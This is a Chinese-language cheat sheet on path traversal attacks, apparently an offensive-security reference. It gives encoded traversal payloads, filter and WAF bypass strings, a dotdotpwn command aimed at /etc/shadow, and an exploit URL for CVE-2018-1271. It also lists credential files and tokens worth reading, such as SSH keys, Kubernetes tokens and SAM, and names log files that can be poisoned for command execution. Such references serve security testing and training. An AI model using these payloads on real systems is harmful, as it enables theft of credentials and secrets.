# 目录遍历

> 路径遍历，也称为目录遍历，是一种安全漏洞，当攻击者操纵引用文件的变量，使用“点点斜杠（../）”序列或类似构造时发生。这可能允许攻击者访问存储在文件系统上的任意文件和目录。

## 摘要

- 工具
- 基本利用
  - 16位Unicode编码
  - UTF-8 Unicode编码
  - 绕过将"../"替换为空
  - 使用";"绕过"../"
  - 双重URL编码
  - UNC绕过
  - NGINX/ALB绕过
  - ASPNET无Cookie绕过
- 路径遍历
  - 有趣的Linux文件
  - 有趣的Windows文件
- 参考资料

## 工具

- dotdotpwn - https://github.com/wireghoul/dotdotpwn

  ```powershell
  git clone https://github.com/wireghoul/dotdotpwn
  perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
  ```

## 基本利用

我们可以使用`..`字符来访问父目录，以下字符串是几种编码，可以帮助你绕过实现不佳的过滤器。

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### 16位Unicode编码

```powershell
. = %u002e
/ = %u2215
\ = %u2216
```

### UTF-8 Unicode编码

```powershell
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

### 绕过 "../" 限制的方法

1. **重复字符绕过**：当遇到移除 `../` 字符的Web应用防火墙（WAF）时，可以通过重复这些字符来绕过。

 ``` ..././``` 

 ```...\.\```

1. **使用分号绕过**：通过在路径中使用分号 `;` 来代替 `../`。

```..;/
..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt
```

### 双重URL编码

通过双重URL编码特定的字符来绕过限制。

```powershell
. = %252e
/ = %252f
\ = %255c
```

**例如**：利用Spring MVC目录遍历漏洞（CVE-2018-1271）

```powershell
http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

### UNC路径遍历绕过

攻击者可以将Windows UNC共享（'\UNC\shareame'）注入到软件系统中，可能会重定向访问到非预期位置或任意文件。

```powershell
\\localhost\c$\windows\win.ini
```

### NGINX/ALB绕过

在某些配置下的NGINX和ALB可以阻止路由中的遍历攻击。例如：`http://nginx-server/../../` 会返回400错误请求。

为了绕过此行为，只需在URL前添加正斜杠：`http://nginx-server////////../../`

### ASPNET无Cookie会话绕过

当启用了无Cookie会话状态时，ASP.NET会将Session ID直接嵌入到URL中。

例如：一个典型的URL可能从 `http://example.com/page.aspx` 转换为：`http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`。括号内的值是Session ID。

我们可以利用这种行为来绕过被过滤的URL。

```powershell
/admin/(S(X))/main.aspx
/admin/Foobar/(S(X))/../(S(X))/main.aspx
/(S(X))/admin/(S(X))/main.aspx
```

### Java绕过

绕过Java的URL协议：

```powershell
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

## 路径遍历

### 有趣的Linux文件

```powershell
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
```

### 有趣的Windows文件

在近期的Windows机器中始终存在的文件。
非常适合测试路径遍历，但里面没有什么有趣的东西……

```powershell
c:\windows\system32\license.rtf
c:\windows\system32\eula.txt
```

文件列表 (来源 https://github.com/soffensive/windowsblindread)

```powershell
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```

以下日志文件是可控的，并且可以通过包含恶意有效负载来实现命令执行

```powershell
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```
## Labs

* [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
* [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
* [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
* [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
* [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
* [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

## References

* [Path Traversal Cheat Sheet: Windows](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
* [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
* [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
* [NGINX may be protecting your applications from traversal attacks without you even knowing](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
* [Directory traversal - Portswigger](https://portswigger.net/web-security/file-path-traversal)
* [Cookieless ASPNET - Soroush Dalili](https://twitter.com/irsdl/status/1640390106312835072)